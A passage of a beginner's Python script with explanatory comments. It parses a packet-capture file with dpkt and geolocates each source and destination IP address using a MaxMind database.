# MAC addresses a couple chapters ago). For this one, we use the maxmind database
# with the pygeoip library.

def print_ip_location(ip):
    with geoip2.database.Reader('locations.mmdb') as gi:
        try:
            rec = gi.city(ip)
            city = rec.city.name
            country = rec.country.name

            if city != '':
                geoloc = city + ', ' + country
            else:
                geoloc = country

            return geoloc
        except:
            return 'unregistered'

# Using dpkt or scapy, we can look at network packets, and even take a look at each layer.


def print_pcap(pcap):
    for _, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = inet_ntoa(ip.src)
            dst = inet_ntoa(ip.dst)
            print("[+] Src: {} ---> Dst: {}".format(src, dst))
            print(print_ip_location(src), print_ip_location(dst))
        except:
            pass


def pcap_main(pcap_file):
    with open(pcap_file, 'rb') as file:
        pcap = dpkt.pcap.Reader(file)
        print_pcap(pcap)

# To recap, you must get the pcap (hehe) file and pass it into the pcap_main function. Pcap
# is a capture of network activity, which can be done by the pypcap library. However, this
# library has bad documentation, so I decided to use the scapy library which I'd heard about.
# Using the sniff method, I downloaded all source and destination packets into a pcap file and
# passed it to the functions above which showed a list of packets being sent from my IP to
# whatever server of the website I was visiting during the sniff session. If the city wasn't
# listed in the maxmind database, it is listed as unregistered, otherwise it spits out the
# city and country of the server; since there is a lot of packets being sent to and fro
# my computer to servers, some IPs get repeated. For eg. 1.1.1.1 -> 2.2.2.2 and then
# 2.2.2.2 -> 1.1.1.1 i.e. the src and dest get switched on each request and response
# cycle (from what I understand).